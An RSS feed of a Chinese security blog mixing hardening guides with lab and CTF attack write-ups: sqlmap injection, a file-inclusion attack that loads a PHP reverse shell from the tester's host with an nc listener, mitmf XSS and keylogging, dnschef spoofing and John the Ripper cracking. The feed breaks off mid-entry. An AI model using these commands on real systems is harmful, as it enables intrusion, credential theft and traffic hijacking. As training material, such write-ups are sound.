<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Jaie</title>
    <link>https://jaie.cc/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Tue, 02 Jul 2019 14:59:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>修改远程桌面3389端口</title>
      <link>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/</link>
      <guid>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/</guid>
      <pubDate>Tue, 02 Jul 2019 14:55:02 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接连不上。&lt;br&gt;&lt;br&gt;运行regedit找到注册表&lt;br&gt;[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Termina
        
      
      </description>
      
      <content:encoded><![CDATA[<p>在修改前在防火墙添加修改远程端口的允许通过的策略，或者暂时关闭防火墙，不然修改完端口号远程连接连不上。<br><br>运行regedit找到注册表<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] PortNumber位置，点击十进制，修改远程连接的端口号，这里以4567为列。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702193333.png" alt><br><br> 找到注册表[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] 双击右边 PortNumber-点十进制-更改值为：4567<br> 使其注册表生效，这里windows server2008/2012 为例，重启生效，<br> 或者运行service.msc，找到remote desktop service服务管理重启生效<br><br> 这里以windows server2008/2012 为例，像xp、server2003比较旧的系统是没有remote desktop service服务,需要重启才能生效<br><br> <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/Snipaste_2019-07-02_21-38-17.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702215102.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190702215325.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/07/02/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>windows服务器主机加固</title>
      <link>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/</link>
      <guid>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/</guid>
      <pubDate>Sat, 15 Jun 2019 12:07:36 GMT</pubDate>
      <description>
      
        
        
          &lt;h4 id=&quot;1-禁用Guest账户和无关账户&quot;&gt;&lt;a href=&quot;#1-禁用Guest账户和无关账户&quot; class=&quot;headerlink&quot; title=&quot;1.禁用Guest账户和无关账户&quot;&gt;&lt;/a&gt;1.禁用Guest账户和无关账户&lt;/h4&gt;&lt;p&gt;Guest账户为黑客入侵打开
        
      
      </description>
      
      <content:encoded><![CDATA[<h4 id="1-禁用Guest账户和无关账户"><a href="#1-禁用Guest账户和无关账户" class="headerlink" title="1.禁用Guest账户和无关账户"></a>1.禁用Guest账户和无关账户</h4><p>Guest账户为黑客入侵打开了方便之门，黑客使用Guest账户可以进行提权。禁用Guest账户是最好的选择。<br>操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;本地用户和组-&gt;用户-&gt;Guest”<br>“账户已禁用”打勾启用<br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615152823.png" alt>   </p><h4 id="2-密码策略加强"><a href="#2-密码策略加强" class="headerlink" title="2.密码策略加强"></a>2.密码策略加强</h4><p>  操作系统、用户身份鉴别信息应具有不易被冒用的特点，口令应复杂度要求并定期更换。<br>  操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;密码策略”;<br></p><blockquote><p>“密码必须符合复杂度要求” 设 置为“启用” <br><br>“密码长度最小值”设置为“8个字符”<br><br>“密码最长使用期限”设置为“90天”<br><br>“强制密码历史”设置为“记住5个密码”<br><br>“用可以还原的加密来存储密码”设置为“禁用”<br>  </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153540.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153659.png" alt>   </p><h4 id="3-账户锁定策略加强"><a href="#3-账户锁定策略加强" class="headerlink" title="3.账户锁定策略加强"></a>3.账户锁定策略加强</h4><p>对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过5 次（不含5 次），锁定该用户使用的账号。<br>操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“帐户策略-&gt;帐户锁定策略”：</p><blockquote><p>“账户额锁定阀值”设置为 5 次<br><br>“账户锁定时间”设置为 15分钟<br><br>“复位账户锁定计数器”设置为 15分钟<br></p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615153915.png" alt><br><strong>加固后</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154011.png" alt>   </p><h4 id="4-设置安全审计"><a href="#4-设置安全审计" class="headerlink" title="4.设置安全审计"></a>4.设置安全审计</h4><p>在主机的审核策略上设置日志审核策略<br>操作流程：进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;审核策略”<br>在主机的审核策略上设置日志审核策略：<br></p><blockquote><p>审计帐户登录事件： 成功，失败 <br><br>审计帐户管理： 成功，失败 <br><br>审计目录服务访问： 成功，失败<br><br>审计登录事件： 成功，失败 <br><br>审计对象访问： 成功，失败 <br><br>审计策略更改： 成功，失败 <br><br>审计特权使用： 成功，失败 <br><br>审计系统事件： 成功，失败<br><br>审计过程追踪： 成功，失败</p></blockquote><p><strong>加固前:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154341.png" alt><br><strong>加固后:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154347.png" alt></p><h4 id="5-设置不显示上次使用的用户名"><a href="#5-设置不显示上次使用的用户名" class="headerlink" title="5.设置不显示上次使用的用户名"></a>5.设置不显示上次使用的用户名</h4><p>在本地安全设置系统登录时不显示上次使用的用户名。<br>进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项”；   </p><blockquote><p>“交互式登录：不显示上次的用户名”设置为“已启用”   </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154607.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154633.png" alt>   </p><h4 id="6启用主机安全选项的”关机前清除虚拟内存页面”"><a href="#6启用主机安全选项的”关机前清除虚拟内存页面”" class="headerlink" title="6启用主机安全选项的”关机前清除虚拟内存页面”"></a>6启用主机安全选项的”关机前清除虚拟内存页面”</h4><p>启用主机安全选项的“关机前清除虚拟内存页面<br>操作流程:进入“控制面板-&gt;管理工具-&gt;本地安全策略”，在“本地策略-&gt;安全选项   </p><blockquote><p>关机：清除虚拟页面文件内存”设置为“已启用”   </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615154913.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155009.png" alt></p><h4 id="7-配置日志文件大小"><a href="#7-配置日志文件大小" class="headerlink" title="7.配置日志文件大小"></a>7.配置日志文件大小</h4><p>   配置日志文件容量，避免受到未预期的删除、修改或覆盖等<br> 操作流程：进入“控制面板-&gt;管理工具-&gt;计算机管理-&gt;事件查看器-&gt;windows日志”，配置<br><strong>加固前：<br> <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155216.png" alt><br>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155337.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155348.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155441.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155449.png" alt>   </p><h4 id="8-磁盘配额配置"><a href="#8-磁盘配额配置" class="headerlink" title="8.磁盘配额配置"></a>8.磁盘配额配置</h4><p>磁盘配额可以限制指定账户能够使用的磁盘空间,这样可以避免因某个用户的过度使用磁盘空间造成其他用户无法正常工作甚至影响系统运行<br>操作流程：进入“我的电脑-&gt;C盘-&gt;属性-&gt;配额”，   </p><blockquote><p>“启用磁盘管理”设置为启用<br><br>“磁盘空间限制为”设置为”90GB”<br><br>“将警告等级设为”设置为”90GB”<br><br>“用户超出配额限制时记录事件（G）”打勾启用<br><br>“用户超过警告等级时记录事件（V）”    打勾启用<br></p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155700.png" alt><br><strong>加固后：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155707.png" alt></p><h4 id="9-远程会话策略"><a href="#9-远程会话策略" class="headerlink" title="9.远程会话策略"></a>9.远程会话策略</h4><p>默认情况下，远程桌面服务允许用户从远程桌面服务会话开连接，而不用注销和结束会话。启用此策略设置，则达到指定时间后将从服务器中删除已断开连接的会话<br>操作流程：进入“运行-&gt;gpedit.msc-&gt;计算机配置-&gt;管理模板-&gt;wondows组件-&gt;远程服务-&gt;远程桌面会话主机-&gt;会话时间限制”，   </p><blockquote><p>“设置已中断会话的时间限制”设置为“已启用”<br><br>“结束已断开连接的会话”设置为“5分钟”    </p></blockquote><p><strong>加固前：</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615155926.png" alt>   <strong>加固后:</strong><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190615160011.png" alt>   </p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/06/15/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Bugku-web题，ctf模拟题sql注入神奇的登陆框</title>
      <link>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</link>
      <guid>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</guid>
      <pubDate>Fri, 17 May 2019 00:43:16 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;这是Bugku-web题，地址为&lt;a href=&quot;http://123.206.87.240:9001/sql/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:9001/sql/&lt;/a&gt;&lt;br&gt;登陆网站，打开bu
        
      
      </description>
      
      <content:encoded><![CDATA[<p>这是Bugku-web题，地址为<a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a><br>登陆网站，打开burp进行截断，账号密码随便打，burp截取后进行保存。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130526.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130714.png" alt><br>使用sqlmap自动注入，可以发现数据库版本，数据库名<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429114029.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429114138.png" alt><br>使用sqlmap自动注入，发现表名flag1<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429132601.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429132651.png" alt><br>使用sqlmap自动注入，查看表flag1中列flag1的值<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429130920.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131021.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131114.png" alt><br>使用sqlmap自动注入，可以列flag1的值<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190429131144.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/05/17/Bugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>linux系统安全配置</title>
      <link>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</link>
      <guid>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</guid>
      <pubDate>Fri, 17 May 2019 00:42:53 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;用户管理&quot;&gt;&lt;a href=&quot;#用户管理&quot; class=&quot;headerlink&quot; title=&quot;用户管理&quot;&gt;&lt;/a&gt;用户管理&lt;/h3&gt;&lt;h5 id=&quot;1-删除系统特殊的用户账号和组账号&quot;&gt;&lt;a href=&quot;#1-删除系统特殊的用户账号和组账号&quot; class=&quot;he
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h5 id="1-删除系统特殊的用户账号和组账号"><a href="#1-删除系统特殊的用户账号和组账号" class="headerlink" title="1.删除系统特殊的用户账号和组账号"></a>1.删除系统特殊的用户账号和组账号</h5><p>查看系统所有用户名<code>cat /etc/passwd</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190422211440.png" alt><br>删除用户jaie命令<code>userdel jaie</code></p><h5 id="2-用户密码设置"><a href="#2-用户密码设置" class="headerlink" title="2.用户密码设置"></a>2.用户密码设置</h5><p>编辑login.defs文件<code>vim /etc/login.defs</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190422212541.png" alt>   </p><h5 id="3-修改自动注销账户的时间"><a href="#3-修改自动注销账户的时间" class="headerlink" title="3.修改自动注销账户的时间"></a>3.修改自动注销账户的时间</h5><p>编辑profile<code>vim /etc/profile</code>修改“HISTSIZE”参数的值，即注销等待时间   <br></p><h5 id="4-给系统用户名密码存放文件加锁，防止非授权用户获得权限"><a href="#4-给系统用户名密码存放文件加锁，防止非授权用户获得权限" class="headerlink" title="4.给系统用户名密码存放文件加锁，防止非授权用户获得权限"></a>4.给系统用户名密码存放文件加锁，防止非授权用户获得权限</h5><p>用chattr命令防止系统中某个关键文件被修改:<code>chattr +i /etc/passwd</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427213536.png" alt></p><h3 id="系统管理配置"><a href="#系统管理配置" class="headerlink" title="系统管理配置"></a>系统管理配置</h3><h5 id="1-关闭系统不必要的服务"><a href="#1-关闭系统不必要的服务" class="headerlink" title="1.关闭系统不必要的服务"></a>1.关闭系统不必要的服务</h5><p><code>cd /etc/init.d/</code>目录下，使用mv命令把init.d下改为*.old类的文件名，目的是让系统启动时找不到这个服务的文件<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427214415.png" alt><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427214415.png" alt></p><h5 id="2-修改init-d目录执行权限，防止修改"><a href="#2-修改init-d目录执行权限，防止修改" class="headerlink" title="2.修改init.d目录执行权限，防止修改"></a>2.修改init.d目录执行权限，防止修改</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427220856.png" alt></p><h5 id="3-给系统服务端口列表文件加锁"><a href="#3-给系统服务端口列表文件加锁" class="headerlink" title="3.给系统服务端口列表文件加锁"></a>3.给系统服务端口列表文件加锁</h5><p>防止未经许可的删除或添加服务<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427215120.png" alt>   </p><h5 id="4-修改ssh服务端口"><a href="#4-修改ssh服务端口" class="headerlink" title="4.修改ssh服务端口"></a>4.修改ssh服务端口</h5><p><code>vi /etc/ssh/ssh_config</code>把port前的#去掉，并修改端口号，保存退出。重启shh服务<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427220448.png" alt></p><h5 id="5-修改部分系统文件的SUID和SGID的权限"><a href="#5-修改部分系统文件的SUID和SGID的权限" class="headerlink" title="5.修改部分系统文件的SUID和SGID的权限"></a>5.修改部分系统文件的SUID和SGID的权限</h5><p>权限为SUID和SGID的执行文件，在程序运行过程中，会给进程所有者权限，如果被黑客利用就会给系统造成危害。修改chage文件的权限<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190427221401.png" alt>   </p><h5 id="6-日志管理"><a href="#6-日志管理" class="headerlink" title="6.日志管理"></a>6.日志管理</h5><p>使用dmesg查看系统引导日志<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190428201734.png" alt><br><code>cd /var/log/</code>在log中可以看到一些的日志文件，修改这些日志的权限可以防止不相干的人修改。   </p><ul><li>lastlog记录用户最后一次成功登录时间   </li><li>loginlog不良的登录尝试记录   </li><li>messages 记录输出系统主控台以及由syslog系统服务程序产生的消息  </li><li>utmp记录当前当前登录得每个用户</li><li>utmp扩展得utmp</li><li>wtmp 记录每一次用户登陆和注销的历史消息  </li><li>wtmpx 扩展的wtmp</li><li>vold.log记录使用外部介质出现的错误</li><li>xferkig记录ftp的存取情况</li><li>sulog记录su命令的使用情况</li><li>acct记录每个用户使用过的命令 </li><li>aculog拔出移动呼叫记录</li><li>XFree86.0.log记录Xfree86 Xwindows服务器最后一次执行的结果<br>文件数字带有.1,.2,.3…文件为轮询日志文件。数字越大，日志越老   </li></ul>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/05/17/linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/#disqus_thread</comments>
    </item>
    
    <item>
      <title>文件遍历漏洞</title>
      <link>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
      <guid>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
      <pubDate>Thu, 25 Apr 2019 07:54:06 GMT</pubDate>
      <description>
      
        
        
          &lt;ol&gt;
&lt;li&gt;环境搭建&lt;br&gt;测试机ip：192.168.86.135&lt;br&gt;&lt;br&gt;靶机metasploittable的ip:192.168.86.128&lt;br&gt;靶机编辑php.ini文件&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/php5/c
        
      
      </description>
      
      <content:encoded><![CDATA[<ol><li>环境搭建<br>测试机ip：192.168.86.135<br><br>靶机metasploittable的ip:192.168.86.128<br>靶机编辑php.ini文件</li></ol><pre><code>sudo vim /etc/php5/cgi/php.ini  //编辑php配置文件</code></pre><p>找到allow_url_include这一行把Off改成On，  </p><pre><code>sudo /etc/init.d/apache2 restart //重启apache服务 </code></pre><ol start="2"><li>发起攻击  </li></ol><ul><li>尝试文件<code>/etc/passwd</code>遍历查看，成功。<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.07-59.png" alt></li><li>尝试定位url链接，成功<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%80%E4%B8%AAurl%202018.11.21%2022.13-23.png" alt></li><li>测试机开启apache服务，制作php反弹shell，使其定位其链接<a href="http://192.168.86.135/1.php" target="_blank" rel="noopener">http://192.168.86.135/1.php</a><br><code>`</code><br>cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php  //复制成1.php到web目录下<br>vim 1.php //修改127.0.0.1成测试机ip完成保存<br>service apache2 start  //开启apache服务<br><br>nc -nvvlp 1234  //nc开启监控端口</li></ul><p><code>`</code><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/php%E5%8F%8D%E5%BC%B9shell.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.27-9.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.28-18.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
    </item>
    
    <item>
      <title>mitmf使用实行中间人xss攻击</title>
      <link>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</link>
      <guid>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</guid>
      <pubDate>Thu, 25 Apr 2019 07:38:50 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;下载mitmf&quot;&gt;&lt;a href=&quot;#下载mitmf&quot; class=&quot;headerlink&quot; title=&quot;下载mitmf&quot;&gt;&lt;/a&gt;下载mitmf&lt;/h5&gt;&lt;p&gt;&lt;code&gt;apt-get install mitmf&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;ht
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="下载mitmf"><a href="#下载mitmf" class="headerlink" title="下载mitmf"></a>下载mitmf</h5><p><code>apt-get install mitmf</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424103338.png" alt><br>kali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。</p><h5 id="mitmf实行xss攻击"><a href="#mitmf实行xss攻击" class="headerlink" title="mitmf实行xss攻击"></a>mitmf实行xss攻击</h5><h6 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h6><p><code>cd /usr/share.beef/</code>目录下，<code>./beef</code>启动beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141449.png" alt><br>默认账号密码都为beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424105202.png" alt><br>使用arp欺骗，插入js脚本，实现xss攻击<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141126.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141601.png" alt><br>可以看到网页源码已经插入js脚本了<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141737.png" alt>   </p><h5 id="mitmf键盘记录器"><a href="#mitmf键盘记录器" class="headerlink" title="mitmf键盘记录器"></a>mitmf键盘记录器</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150858.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150940.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151056.png" alt><br>mitmf网页图片倒置（恶作剧）<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151819.png" alt></p><h4 id="mitmf-cookie显示"><a href="#mitmf-cookie显示" class="headerlink" title="mitmf cookie显示"></a>mitmf cookie显示</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152517.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/#disqus_thread</comments>
    </item>
    
    <item>
      <title>dnschefDNS欺骗</title>
      <link>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</link>
      <guid>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</guid>
      <pubDate>Wed, 24 Apr 2019 07:40:07 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;dnschef –fakeip=192.168.200.2 –fakedomains=&lt;a href=&quot;http://www.baidu.com,www.qq.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.baidu.com,www.qq.
        
      
      </description>
      
      <content:encoded><![CDATA[<p>dnschef –fakeip=192.168.200.2 –fakedomains=<a href="http://www.baidu.com,www.qq.com" target="_blank" rel="noopener">www.baidu.com,www.qq.com</a> –interface 192.168.200.243 -q<br>fackip欺骗到指定的ip，facedomains欺骗域名<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419162125.png" alt><br>window修改dns服务器<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419162027.png" alt></p>]]></content:encoded>
      
      <comments>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/#disqus_thread</comments>
    </item>
    
    <item>
      <title>使用john破解密码</title>
      <link>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
      <guid>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
      <pubDate>Wed, 24 Apr 2019 07:38:36 GMT</pubDate>
      <description>
      
        
        
          &lt;pre&gt;&lt;code&gt; john
Created directory: /root/.john
John the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx]
Copyri
        
      
      </description>
      
      <content:encoded><![CDATA[<pre><code> johnCreated directory: /root/.johnJohn the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx]Copyright (c) 1996-2015 by Solar Designer and othersHomepage: http://www.openwall.com/john/Usage: john [OPTIONS] [PASSWORD-FILES]--single[=SECTION]        &quot;single crack&quot; mode   --wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin                  --pipe  like --stdin, but bulk reads, and allows rules--loopback[=FILE]         like --wordlist, but fetch words from a .pot file--dupe-suppression        suppress all dupes in wordlist (and force preload)--prince[=FILE]           PRINCE mode, read words from FILE--encoding=NAME           input encoding (eg. UTF-8, ISO-8859-1). See also                          doc/ENCODING and --list=hidden-options.--rules[=SECTION]         enable word mangling rules for wordlist modes--incremental[=MODE]      &quot;incremental&quot; mode [using section MODE]--mask=MASK               mask mode using MASK--markov[=OPTIONS]        &quot;Markov&quot; mode (see doc/MARKOV)--external=MODE           external mode or word filter--stdout[=LENGTH]         just output candidate passwords [cut at LENGTH]--restore[=NAME]          restore an interrupted session [called NAME]--session=NAME            give a new session the NAME--status[=NAME]           print status of a session [called NAME]--make-charset=FILE       make a charset file. It will be overwritten--show[=LEFT]             show cracked passwords [if =LEFT, then uncracked]--test[=TIME]             run tests and benchmarks for TIME seconds each--users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only--groups=[-]GID[,..]      load users [not] of this (these) group(s) only--shells=[-]SHELL[,..]    load users with[out] this (these) shell(s) only--salts=[-]COUNT[:MAX]    load salts with[out] COUNT [to MAX] hashes--save-memory=LEVEL       enable memory saving, at LEVEL 1..3--node=MIN[-MAX]/TOTAL    this node&#39;s number range out of TOTAL count--fork=N                  fork N processes--pot=NAME                pot file to use--list=WHAT               list capabilities, see --list=help or doc/OPTIONS--format=NAME             force hash of type NAME. The supported formats can                          be seen with --list=formats and --list=subformats</code></pre><h4 id="破解linux密码"><a href="#破解linux密码" class="headerlink" title="破解linux密码"></a>破解linux密码</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416202809.png" alt><br>显示已完成破解的密码文件<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203204.png" alt><br>john破解缓存文件夹<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203451.png" alt><br><img 